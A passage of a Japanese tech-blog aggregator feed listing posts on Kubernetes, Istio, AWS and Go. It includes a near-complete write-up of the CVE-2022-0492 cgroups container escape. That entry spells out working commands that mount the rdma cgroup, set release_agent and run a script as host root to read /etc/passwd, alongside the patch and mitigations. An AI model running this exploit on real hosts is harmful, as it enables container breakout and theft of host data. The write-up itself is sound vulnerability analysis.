ふり返る暇なんて無いねワクチン4回目打った\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89 - ふり返る暇なんて無いね11月に向けてといっても11月始まってますが。11月は資格の勉強もあるし、新しい固めのお仕事も始まるので、だいぶヘビーになる予感を感じてます。寒くなる季節なので体調には気を付けつつも、引き続き温泉につかり、ブログ書くのも続けて行きたいですね。","isoDate":"2022-11-08T23:20:07.000Z","dateMiliSeconds":1667949607000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/10/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20221028","contentSnippet":"#kubenewsの2022年10月28日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/whnN4hwsIYg 告知とかニュースっぽいもの Open Networking Conference Japanちょうど今日開催し...","isoDate":"2022-10-28T13:05:14.000Z","dateMiliSeconds":1666962314000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes クラスタ内ホスト名に CNAME レコードでエイリアスを付与したい","link":"https://zenn.dev/toshikish/articles/7f555dbf1b4b7d","contentSnippet":"Kubernetes クラスタ内で使えるホスト名に CNAME レコード相当でエイリアスを付与したい場合を考えます。クラスタ内では CoreDNS が使われているものとします。 TL;DRCorefile（CoreDNS の設定ファイル）で rewrite プラグインを使って記述します。例えば Service のアドレスである foo.default.svc.cluster.local を foo.example.com にエイリアスしたい場合は以下のように行を追加します。apiVersion: v1kind: ConfigMapmetadata:  name: cor...","isoDate":"2022-10-28T10:45:26.000Z","dateMiliSeconds":1666953926000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Bugless Code","link":"https://speakerdeck.com/yunosukey/bugless-code","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Tests in Go","link":"https://speakerdeck.com/yunosukey/tests-in-go","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"DB Tree Algorithms","link":"https://speakerdeck.com/yunosukey/db-tree-algorithms","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"React and XSS","link":"https://speakerdeck.com/yunosukey/react-and-xss","contentSnippet":"","isoDate":"2022-10-16T04:00:00.000Z","dateMiliSeconds":1665892800000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Istio のサービスへの接続でプロトコルエラーになる","link":"https://zenn.dev/toshikish/articles/d0dd54ae067bed","contentSnippet":"現象Istio サービスメッシュを有効にした Kubernetes クラスタ内に立てた Service に接続しようとするも，upstream connect error or disconnect/reset before headers. reset reason: protocol error が出て到達できない。例えば，以下のような Service に gRPC で接続しようとしても失敗する。apiVersion: v1kind: Servicemetadata:  name: my-servicespec:  selector:    app.kubern...","isoDate":"2022-10-04T02:55:06.000Z","dateMiliSeconds":1664852106000,"authorName":"toshikish","authorId":"toshikish"},{"title":"SQL*Loaderで複数の文字コードが混ざったデータをロードする","link":"https://zenn.dev/nnaka2992/articles/load_complex_characterset_oracle","contentSnippet":"SQL*Loaderで複数の文字コードが混ざったデータをロードする 概要単一のテキストファイル内で特定のカラムのみ文字コードが違うファイルをSQL*Loaderでデータベースに取り込む方法 注意本記事で扱っている対処方法はおそらく紛れ込んだ文字コードが本来あるべき文字コードの一部として解釈できない場合使用できないと思います。(未検証)最低限文字化けしながらも読み込める状態を想定しています。 結論コントロールファイル内で文字コードの変換が必要なカラムに以下の関数を適用する。column \\"CONVERT(:column, \'target_charset\', \'s...","isoDate":"2022-09-25T14:48:29.000Z","dateMiliSeconds":1664117309000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[2022/09/02] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220902","contentSnippet":"#kubenewsの2022年09月2日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/r2YsmQFcv-o 告知とかニュースっぽいもの controller-runtime clientについてhttps://zenn....","isoDate":"2022-09-02T13:01:11.000Z","dateMiliSeconds":1662123671000,"authorName":"bells17","authorId":"bells17"},{"title":"Visual Studio Codeで使えるリモート環境のdevcontainerが意外と便利そうだったのでまとめ","link":"https://zenn.dev/bells17/articles/remote-ssh-devcontainer","contentSnippet":"試してたらたまたまVisual Studio Code(vscode)のdevcontainer(Remote Container)が、Remote SSH経由でリモート環境でも使えることを知ったので、devcontainer用の環境構築方法やdevcontainerの構築方法についてまとめてみた今まではローカル環境のdockerか、codespaceでしか利用できないのかなと思っていたのだけど、リモート含めて利用できるとかなり便利そうな印象だったので一通り試してみました最近はRemote SSHでリモート環境を利用するケースが多いのでリモート環境で使えないならそんなに使えないかなと...","isoDate":"2022-09-01T18:16:25.000Z","dateMiliSeconds":1662056185000,"authorName":"bells17","authorId":"bells17"},{"title":"controller-runtime clientについて","link":"https://zenn.dev/bells17/articles/controller-runtime-client","contentSnippet":"KubernetesでOperatorやControllerを開発する際に利用するフレームワークであるcontroller-runtimeのclientについて調べたのでまとめます。この記事の目的は以下のような感じになります:controller-runtimeが提供するKubernetes clientの概要についてまとめることcontroller-runtime client周りの追加の不明点などがあった場合には、この記事をベースにコードベースで調べたいことをすぐに調べられる程度にはコードレベルで詳しい内容をまとめること以下についてわかるようになること各種内部clien...","isoDate":"2022-08-27T09:30:47.000Z","dateMiliSeconds":1661592647000,"authorName":"bells17","authorId":"bells17"},{"title":"Software Design 2022年9月号にコードリーディングに関する記事を寄稿しました","link":"https://bells17.medium.com/oss-source-code-reading-29392edf80fe?source=rss-713cf42ce34d------2","isoDate":"2022-08-18T15:06:54.000Z","dateMiliSeconds":1660835214000,"authorName":"bells17","authorId":"bells17"},{"title":"Security Command Center \xd7 PagerDuty 自動アラート通知の取り組み","link":"https://speakerdeck.com/kyohmizu/security-command-center-x-pagerduty-zi-dong-aratotong-zhi-falsequ-rizu-mi","contentSnippet":"3-shake SRE Tech Talk #4 の登壇資料です。\\rhttps://3-shake.connpass.com/event/253028/","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"SRETT#4黒い画面をもっと効率的に(使って自動化の時間を捻出)","link":"https://speakerdeck.com/masasuzu/srett-number-4hei-ihua-mian-womotutoxiao-lu-de-ni-shi-tutezi-dong-hua-falseshi-jian-wonian-chu","contentSnippet":"","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[2022/07/015] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220715","contentSnippet":"#kubenewsの2022年07月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/ar1_fxX601E 告知とかニュースっぽいもの 『Linuxで動かしながら学ぶTCP/IPネットワーク入門』でネットワークの勉強をし...","isoDate":"2022-07-15T07:31:08.000Z","dateMiliSeconds":1657870268000,"authorName":"bells17","authorId":"bells17"},{"title":"サイバー攻撃から Kubernetes クラスタを守るための効果的なセキュリティ対策","link":"https://speakerdeck.com/kyohmizu/saibagong-ji-kara-kubernetes-kurasutawoshou-rutamefalsexiao-guo-de-nasekiyuriteidui-ce","contentSnippet":"CloudNative Security Conference 2022 プレイベント の登壇資料です。\\rhttps://cloudnativedays.connpass.com/event/252961/","isoDate":"2022-07-12T04:00:00.000Z","dateMiliSeconds":1657598400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/07/01] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220701","contentSnippet":"#kubenewsの2022年07月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/R7VHtaBZFkQ 告知とかニュースっぽいもの Kubernetes Novice Tokyo #20にてKueueのセッションを行...","isoDate":"2022-07-01T11:14:01.000Z","dateMiliSeconds":1656674041000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS SAP 合格体験記 2022/06","link":"https://zenn.dev/tayusa/articles/7b3dd99a79403c","contentSnippet":"はじめにネットで公開されている数々のAWS Certified Solutions Architect - Professionalの合格体験記や勉強法などにお世話になったので自分も書いてみることにしました。教材選びや学習スケジュールの参考になれば嬉しいです。 私の前提知識まず、本題に入る前に私のSAPを受ける前までのスキルセットを軽く紹介させてください。業務でのAWS歴は8ヶ月ほどで現在SREとして働いています以前はRuby on Railsなどを書くプログラマーをやっていましたAWS SAAは2022/03に取得しましたAWSではない他のIT資格は以下で...","isoDate":"2022-06-24T00:36:49.000Z","dateMiliSeconds":1656031009000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"istio-proxyがどのように通信を仲介しているかを知る","link":"https://zenn.dev/tayusa/articles/aa54bbff3d0d2d","contentSnippet":"目的前回、書いた記事で素のKubernetesのネットワークについて少し理解できたのですが、Istioを入れた場合はEnvoyが通信を仲介するのでその仕組みを知りたく調べてみましたhttps://zenn.dev/tayusa/articles/c705cd65b6ee74 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 クラスタのセットアップ kindでクラスタ作成https:...","isoDate":"2022-06-03T18:42:53.000Z","dateMiliSeconds":1654281773000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"asdf のバージョン アップがうまくいかなかった","link":"https://zenn.dev/kyohei_saito/articles/40a13800f34d5f","contentSnippet":"最近、転職により業務環境が Windows から Mac に変わったことで、ツール類のバージョン管理として asdf を使用しはじめました。asdf 自体のバージョンアップがうまくいかない事象に直面したため、解決方法をメモしておきます。 サマリHomebrew により asdf をバージョンアップしたら、asdf でインストールしたツールが使用できなくなりました。shim ディレクトリ内のスクリプトに記述された asdf のパスが古いバージョンとなっていたことが原因でした。shim ディレクトリを別のディレクトリに移動後、asdf reshim を実行することで shim デ...","isoDate":"2022-05-29T09:36:54.000Z","dateMiliSeconds":1653817014000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesのServiceの挙動を確認する","link":"https://zenn.dev/tayusa/articles/c705cd65b6ee74","contentSnippet":"目的普段、Kubernetesを触ってはいるのですが、表面的な使い方しか知らないので動きを確認してみます 環境OS: Arch Linux(5.17.9-arch1-1)k8sの環境: kindhttps://kind.sigs.k8s.io/version 0.14.0デフォルトのk8sのバージョンは1.24 ひとまず、ローカルでクラスタを立てる環境に応じてkindをインストールhttps://kind.sigs.k8s.io/docs/user/quick-start/#installationクラスタの作成$ kind ...","isoDate":"2022-05-28T12:19:47.000Z","dateMiliSeconds":1653740387000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Python Experiment: For VS Comprehension 1","link":"https://daisuke1024akagawa.medium.com/python-experiment-for-vs-comprehension-1-28868928fe8d?source=rss-c54ac439ad2b------2","isoDate":"2022-05-26T14:21:48.000Z","dateMiliSeconds":1653574908000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Goで立てたWebサーバーでソケットを学ぶ","link":"https://zenn.dev/tayusa/articles/077d911b357a92","contentSnippet":"目的TCPなどにまるで明るくないので、学習のために調べてみました 環境Arch Linux(5.17.9-arch1-1)go version go1.18.3 linux/amd64 やることGoで書いたWebサーバーを動かして挙動を確認したり、少しコードを見てみますコードは以下ですpackage mainimport (\\t\\"fmt\\"\\t\\"log\\"\\t\\"net/http\\"\\t\\"time\\")func main() {\\thttp.HandleFunc(\\"/\\", func(w http.ResponseWriter, r *http.Request)...","isoDate":"2022-05-22T12:32:11.000Z","dateMiliSeconds":1653222731000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"zennの執筆環境向けdevcontainerを作成した話","link":"https://zenn.dev/bells17/articles/zenn-devcontainer","contentSnippet":"タイトルまんまでzennの執筆環境向けdevcontainerを作成したという話です前々からzennの記事はGithub repositoryと連携して書いており、codespaceにvscodeから接続して執筆してたのですが、zenn-cliを使ったプレビューが可能らしいということを最近知ったので、devcontainerの勉強がてらサクッとプレビューが可能な環境を作りましたという内容になります作ったdevcontainerのリポジトリはこちらですhttps://github.com/bells17/zenn-template 使い方READMEに書いてある通りですが、te...","isoDate":"2022-04-17T15:27:41.000Z","dateMiliSeconds":1650209261000,"authorName":"bells17","authorId":"bells17"},{"title":"[2022/04/15] 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220415","contentSnippet":"普段は#kubenewsの2022年04月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/j76uphcYs2E 告知とかニュースっぽいもの Kubernetes Meetup TokyoでLTする予定ですhttps...","isoDate":"2022-04-15T12:50:24.000Z","dateMiliSeconds":1650027024000,"authorName":"bells17","authorId":"bells17"},{"title":"吉祥寺.pm29で久しぶりにLTしてきました #kichijojipm","link":"https://blog.masasuzu.net/entry/2022/04/15/202342","contentSnippet":"kichijojipm.connpass.com久しぶりにLTしてきました。久しぶりに外で発表したいなと思いつつ、だいぶブランクあるのでちょうどいいリハビリできるところがないかな。— masasuzu (@masasuz) 2022年4月9日  こんなこと考えてたら良いタイミングできちぴーが開催されるので、LT申し込んでみました。#kichijojipm 7年ぶりにLTしたので緊張した。というのと、前回の発表調べて7年前もきちぴーあったのかという驚きもあった。— masasuzu (@masasuz) 2022年4月12日  どうやら7年ぶりだったみたいです。タイミング的に最終出社日の翌日だったので、キャリアの話をしました。diary.masasuzu.net正直、LTにおさまる量じゃなかったのは反省点です。資料ももうちょっとなんとかできたかなあという気持ちがあります。少しずつ登壇回数増やして、勘を取り戻していきたいところ。","isoDate":"2022-04-15T11:23:42.000Z","dateMiliSeconds":1650021822000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2022-04-12 吉祥寺.pm 29","link":"https://speakerdeck.com/masasuzu/2022-04-12-ji-xiang-si-dot-pm-29","contentSnippet":"","isoDate":"2022-04-12T04:00:00.000Z","dateMiliSeconds":1649736000000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"CVE-2022-0492 調査まとめ","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","contentSnippet":"cgroups v1 の脆弱性 CVE-2022-0492 について、調査した内容をまとめました。イベントで発表した内容ですが、時間の都合で語りきれなかった部分も多く、内容を加筆してブログに書くことにしました。 speakerdeck.comCVE-2022-0492 概要release_agent についてエクスプロイト前提条件要点検証修正パッチコンテナセキュリティseccompAppArmor (SELinux)Kubernetes の場合EKS, GKE の場合さいごに参考リンクCVE-2022-0492LinuxコンテナセキュリティCVE-2022-0492 概要CVE-2022-0492 は cgroups v1 における特権昇格・コンテナブレイクアウトの脆弱性です。cgroups v1 の release_agent 機能を悪用することで、コンテナからホストの root 権限で任意コマンド実行が可能となります。詳細は後述しますが、これは本来特権コンテナに限定されるべき設定が、capabilities のチェック漏れにより非特権コンテナから行える状態だったことが原因です。本脆弱性は seccomp や AppArmor/SELinux を有効にすることで回避可能です。release_agent についてcgroups v1 は cpu, memory, pids のようにリソースをサブシステムに分割し、各サブシステムがディレクトリ構造を取っています。# ls /sys/fs/cgroup/blkio  cpu,cpuacct  cpuset   freezer  memory  net_cls           net_prio    pids  systemdcpu    cpuacct      devices  hugetlb  misc    net_cls,net_prio  perf_event  rdma  unifiedrelease_agent は各 cgroup サブシステムのルートディレクトリに配置されるファイルで、cgroup 内のプロセスが終了する時に起動させるプログラムを設定します。リリースエージェントプログラム の起動の有無は、cgroup ディレクトリ内の notify_on_release の値で判断されます。このファイルはルート以下、各 child cgroup のディレクトリにも配置されています。notify_on_release = 1 の場合、リリースエージェントプログラムを起動します。cgroup のディレクトリ構成pids cgroup のルートディレクトリを見ると、以下のように release_agent, notify_on_release のファイルを確認できます。# ls /sys/fs/cgroup/pids/cgroup.clone_children  cgroup.sane_behavior  docker      notify_on_release  system.slice  user.slicecgroup.procs           default               init.scope  release_agent      tasks# cat /sys/fs/cgroup/pids/release_agent   ← 空のファイル# cat /sys/fs/cgroup/pids/notify_on_release 0ちなみにコンテナに CAP_SYS_ADMIN がある場合、release_agent を使えば本脆弱性を利用することなくブレイクアウト可能です。https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)また cgroups v2 には release_agent がなく、リリースの通知は別の仕組みを使っています。エクスプロイト前提条件本脆弱性は次の条件を全て満たす場合に影響があります。root ユーザーまたは、no_new_privsフラグなしでコンテナを起動しているseccomp, AppArmor/SELinux がいずれも有効でないホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルトの設定です）各設定の確認方法↓# cat /proc/sys/kernel/unprivileged_userns_clone   ← 非特権ユーザ名前空間1# cat /proc/self/status | grep Seccomp   ← seccompSeccomp:    0Seccomp_filters:    0# cat /proc/self/attr/current   ← AppArmordocker-default (enforce)要点コンテナから cgroups の release_agent に書き込みたいrdma サブシステムは root cgroup に所属しているが、readonly でマウントされているcgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要unshare で user namespace (ns) を作成すれば CAP_SYS_ADMIN が得られるcgroup, mount ns も同時に作成することで cgroup をマウント可能にrdma cgroup をマウント すると release_agent に書き込み可能cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行検証脆弱な Kernel バージョンで CVE-2022-0492 を検証します。インスタンスに用意した ubuntu 上で、seccomp, AppArmor をオフにした docker コンテナを起動します。# uname -aLinux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashdocker はコンテナ作成時に cgroup ns を作成しないので、コンテナはホストと同じ cgroup ns に所属しています。自身の cgroup を確認すれば root cgroup からのパスがわかるため、コンテナ内から各サブシステムが root cgroup に所属しているかどうか調べることができます。root@ab988587a245:/# cat /proc/self/cgroup13:misc:/12:rdma:/   ← rdma サブシステムは root cgroup11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a0::/system.slice/containerd.serviceこれで rdma サブシステムが root cgroup に所属していることがわかりました。root@ab988587a245:/# mount | grep \'cgroup (ro\'cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされているcgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/total 0-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release-rw-r--r--  1 root root 0 Mar 29 16:01 release_agentdrwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice-rw-r--r--  1 root root 0 Mar 15 01:40 tasksroot@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system   ← 書き込みエラーというわけで、cgroup を rw でマウントできれば良いことになります。ここで capability を確認すると、コンテナは CAP_SYS_ADMIN を持っておらず、このままでは cgroup をマウントする権限がありません。root@ab988587a245:/# apt update && apt install -y libcap2-binroot@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 00000000a80425fbroot@ab988587a245:/# capsh --decode=00000000a80425fb0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcaproot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mntmount: /mnt: permission denied.   ← マウントエラーCAP_SYS_ADMIN を付与するため user ns を作成し新たにプロセスを立ち上げます。さらに mount, cgroup ns を同時に作成することで、コンテナ内でのマウントが可能になります。マウントさえできれば release_agent に書き込むことができます。root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成root@ab988587a245:/# cat /proc/self/status | grep CapEffCapEff: 000001ffffffffffroot@ab988587a245:/# capsh --decode=000001ffffffffff0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つroot@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウントroot@ab988587a245:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@ab988587a245:/# mount | grep \'cgroup (rw\'cgroup on /mnt type cgroup (rw,relatime,rdma)ここまでで、コンテナ内から release_agent に書き込めるようになりました。続いてコンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置します。今回は /etc/passwd をコンテナ内に出力するスクリプトを作成しています。release_agent に設定するのはプログラムのパスですが、ホストから見た絶対パスを指定する必要があります。root@ab988587a245:/# host_path=`sed -n \'s/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p\' /etc/mtab`root@ab988587a245:/# echo $host_path/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパスroot@ab988587a245:/# echo \\"$host_path/cmd\\" > /mnt/release_agentroot@ab988587a245:/# echo \'#!/bin/sh\' > /cmdroot@ab988587a245:/# echo \\"cat /etc/passwd > $host_path/output\\" >> /cmdroot@ab988587a245:/# chmod a+x /cmd最後に用意したプログラムを起動するため、cgroup 内のプロセスを空にします。root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成root@ab988587a245:/# ls /mnt/xx/cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasksroot@ab988587a245:/# echo 1 > /mnt/xx/notify_on_releaseroot@ab988587a245:/# sh -c \\"echo \\\\$\\\\$\\" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加root@ab988587a245:/# cat /output   ← コンテナ内にホストの /etc/passwd が出力されているroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologin...修正パッチhttps://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02afhttps://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)  {    struct cgroup *cgrp;+   struct cgroup_file_ctx *ctx;    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);+   /*+    * Release agent gets called with all capabilities,+    * require capabilities to set release agent.+    */+   ctx = of->priv;+   if ((ctx->ns->user_ns != &init_user_ns) ||+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))+     return -EPERM;    cgrp = cgroup_kn_lock_live(of->kn, false);修正後は上記検証手順での release_agent への書き込みはできません。これは書き込みプロセスが CAP_SYS_ADMIN は持ちますが、init user ns でないためだと理解しています。init user ns かつ CAP_SYS_ADMIN を同時に満たすのは、非特権コンテナにおいては不可能となりました。（厳密にはプロセスの capability と、対象 cgroup の所有 user ns のチェックを行なっています）# uname -r5.17.0-051700rc7-generic# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bashroot@a45e44c77da9:/# unshare -rmC bashroot@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mntroot@a45e44c77da9:/# ls /mntcgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasksroot@a45e44c77da9:/# echo test > /mnt/release_agent bash: echo: write error: Operation not permittedただし特権コンテナでは引き続きコンテナブレイクアウトは可能です。SELinux を設定する等の対策は必要です。コンテナセキュリティコンテナセキュリティと本脆弱性の関係について簡単に見ていきます。seccompseccomp はコンテナ内で実行できるシステムコールを制限します。システムコールをブロックするため、ns を作成する段階でエラーとなります。# docker run --rm -it --security-opt apparmor=unconfined ubuntu bashroot@fb3522b81478:/# cat /proc/self/status | grep SeccompSeccomp:    2Seccomp_filters:    1root@fb3522b81478:/# unshare -rmC bashunshare: unshare failed: Operation not permittedAppArmor (SELinux)ファイル操作、プログラム実行、capabilities 等を制限します。# docker run --rm -it --security-opt seccomp=unconfined ubuntu bashroot@46912ffebb2c:/# cat /proc/self/attr/current docker-default (enforce)root@46912ffebb2c:/# unshare -rmC bashunshare: cannot change root filesystem propagation: Permission deniedKubernetes の場合Kubernetes においては、seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響が出る可能性があります。AppArmor/SELinux は Kubernetes ノードやコンテナランタイムで有効にする必要があります。さらに seccomp は Pod のマニフェストにも設定しなければなりません。また securityContext に適切な設定をすることも重要です。allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities 等でコンテナの機能を制限すれば、今後生まれる脆弱性の予防にもなると考えます。EKS, GKE の場合EKS のノードに使われる Amazon Linux 2 では、rdma 